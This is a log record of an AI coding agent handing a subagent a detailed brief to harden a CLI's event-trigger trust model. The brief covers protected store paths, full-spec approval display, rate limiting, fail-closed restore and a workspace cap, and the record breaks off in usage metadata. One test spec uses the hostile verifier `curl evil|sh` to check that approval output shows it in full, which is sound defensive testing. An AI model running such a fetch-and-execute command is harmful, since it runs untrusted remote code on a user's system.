{"parentUuid":"310ddcf5-a140-41a7-a78e-9f1a69c945f7","isSidechain":false,"message":{"model":"claude-sonnet-5-5","id":"msg_011ChNf28K8wLSWrbwfGtbaU","type":"message","role":"assistant","content":[{"type":"tool_use","id":"toolu_01SLXDvFVQ9L6RK2yEgvGziz","name":"Agent","input":{"description":"Fix BG-3 trust model review blockers","subagent_type":"general-purpose","prompt":"Fix the five blockers from the independent review of PR #803 (BG-3 trust and abuse model for event triggers) in the worktree /home/mike/nexus-wt/bg3 (local branch `v1/bg3-trust-abuse-model-cl`, tracking the PR's remote branch `origin/v1/bg3-trust-abuse-model`, head 4dd93530c; Nexus Code, TypeScript CLI in `cli/`). Read the review first: `gh pr view 803 --comments` (the last comment, \"Independent hostile security review at 4dd93530…\"), the PR body, `docs/TRIGGERS.md`, `cli/src/trigger_spec.ts`, `trigger_trust.ts`, `trigger_rate_limit.ts`, `triggers_cli.ts` (paths may be under cli/src/core/ or cli/src; `git show --stat HEAD~1`), their tests, `/home/mike/nexus-wt/bg3/AGENTS.md`, and how HK-1 protected its store and showed what an approval covers (`cli/src/security.ts` DEFAULT_PROTECTED_PATHS lines ~163-190 with `extension_trust.json`, `nexus/hooks.json`; `cli/src/hooks_cli.ts` approve output; `hooks_self_approval.test.ts`). The owner has put BG-3 back in scope for v1.3.0, so this is the base of a trigger firer to be built next; do NOT build the firer now.\n\nFix, each with a test that fails without the fix (mutate a copy of the source file and restore from the copy; never `git checkout` to undo):\n1. Protected path: add `trigger_trust.json` (the actual store file name; and any limiter state file you persist) to `DEFAULT_PROTECTED_PATHS` with a one-line reason, and absolute `~/.config/nexus/...` patterns the way HK-1's #805 does if that has landed on your base (`git fetch origin`; if not, use the same relative pattern style as `extension_trust.json`); test that `isPathProtected` is true for it and that the agent's write/edit/delete/patch tools cannot create or modify it (follow `hooks_self_approval.test.ts`).\n2. `approve` must show everything the approval authorises: print the full canonical spec as it is hashed (kind, id, event with ALL paths/origins/globs, the action including the full prompt (no truncation, but cap at e.g. 4000 chars with an explicit \"[N more characters, not shown: refuse to approve a spec you cannot read in full]\" and refuse approval beyond the cap), `verifier`, policy/level, rate, bounds, whether a secret is configured), and require the typed confirmation to be about THAT hash (show the first 12 hex chars of the hash and require the operator to answer yes). Test with a spec whose verifier is `curl evil|sh` and instructions after char 100: the output must contain both in full.\n3. Rate limiter: do not record denied attempts in the window (denials must not extend the lockout); keep only timestamps as numbers (epoch ms), not strings re-parsed on every call; cap per-trigger arrays; cap the `limiters` map (e.g. 1024 entries, LRU eviction that FAILS CLOSED: an evicted trigger restarts with an empty window but the quarantine record survives in a separate bounded map: choose and document); key limiters on workspace real path + trigger id; when a re-approved spec changes the rate, rebuild the limiter from the new rate; performance test: 3,000 attempts must take well under 200 ms.\n4. `restore()` must validate every restored field (numbers finite and within the spec's bounds, `until` a valid epoch within a sane range, arrays bounded) and on ANY invalid field fall back to quarantine-until-operator-clears (fail closed) rather than admit; tests for `until:\"garbage\"`, `Infinity`, negative, NaN, huge, wrong types, missing fields, extra keys.\n5. Enforce the workspace cap: `checkAndRecord` (or the function the firer will call) must consult `WorkspaceRateLimiter`; 100 triggers firing in a workspace with a cap of N admits at most N; test.\nNon-blocking items to do in the same pass if cheap: (a) docs/TRIGGERS.md: fix the example so it parses (each trigger needs `format` and `version`), remove or implement `nexus triggers release` (prefer: implement as the explicit operator action that clears a quarantine, terminal-only like approve), make the id rule in the docs equal the code, say what the key of the trust store is (canonical hash of each spec) and say plainly that any process with a shell can approve through a faked terminal when unsandboxed (same limit as hooks), reachable-or-not under `--sandbox`; (b) reject duplicate ids in one spec file, and make one bad spec in a file NOT block approval of the others only if that is safe: choose: safer is to refuse approving anything from a file that does not fully parse: do that; (c) the spec file mode 0600 requirement: a git checkout gives 0644: the CLI must say WHY it refused (mode) and how to fix, not just `NEW`; keep refusing group/other-writable files, but accept 0644 if owned by the current user and not group/other-writable (state the choice); (d) `NEXUS_TRUST_WORKSPACE=1` must not make `status` say \"may run: yes\" for a trigger whose workspace is untrusted by the store: use the same trust function the plugin/hook code uses and say which; (e) refuse a secret shorter than 16 characters and say the secret must not live in the repository file (accept `secret_env` naming an environment variable instead; implement only if simple, otherwise reject inline secrets entirely with a message pointing to env); (f) the two surviving mutations: skip-hash in the CLI list, and skipping a corrupt entry: add tests that fail on them.\nThen run, one at a time: the new trigger test files, `security`, `workspace_trust`, `hooks_self_approval`, `leak_guard`, `check_requirements`, `protocol_schema`; `cd cli && npx tsc --noEmit -p .`; the complexity gate (check the exit code); `node scripts/check_invariants.mjs`; `node scripts/check_doc_versions.mjs`. Changed/new test files three times.\nRules: new test files start with `import \"./helpers/leak_guard.js\";`. Run one test file at a time: `cd /home/mike/nexus-wt/bg3/cli && TMPDIR=/dev/shm HOME=$(mktemp -d) node --import tsx --test test/<name>.test.ts 2>&1 | tail -30` (throwaway HOME mandatory; never read the real ~/.nexus, ~/.config/nexus, /etc/nexus; no network, no live inference). Stop processes only by their own pid, never `pkill -f`. Shell is zsh (`bash -c` for loops); output passes through `rtk` (prefix `rtk proxy` if cut); a safety check blocks scripts containing `rm`. `cli/node_modules` is a symlink; Rust binaries are in `core/target/release/`. Before each commit: `git fetch origin`, `git log HEAD..origin/v1/bg3-trust-abuse-model` for foreign commits (another agent owns the PR originally: if there are new commits, merge them), merge origin/release/v1.3.0 (never rebase, never reset over others' work). Commit as `fix(triggers): <what>` + the line `Co-Authored-By: Claude Fable 5.2 <noreply@anthropic.com>`; push with a plain `git push origin v1/bg3-trust-abuse-model-cl:v1/bg3-trust-abuse-model` (never force; if rejected, fetch, merge, retry).\nReport under 400 words: per blocker the file:line of the fix, the tests and the mutation that fails each, the choices you made on the non-blocking items, test counts, commit hash(es), and anything the firer author must know."},"caller":{"type":"direct"}}],"container":null,"stop_reason":"tool_use","stop_sequence":null,"stop_details":null,"usage":{"input_tokens":2,"cache_creation_input_tokens":1282,"cache_read_input_tokens":372025,"output_tokens":2800,"output_tokens_details":{"thinking_tokens":0},"server_tool_use":{"web_search_requests":0,"web_fetch_requests":0},"service_tier":"standard","cache_creation":{"ephemeral_1h_input_tokens":0,"ephemeral_5m_input_tokens":1282},"inference_geo":"global","iterations":[{"input_tokens":2,"output_tokens":2800,"cache_read_input_tokens":372025,"cache_creation_input_tokens":1282,"cache_creation":{"ephemeral_5m_input_tokens":1282,"ephe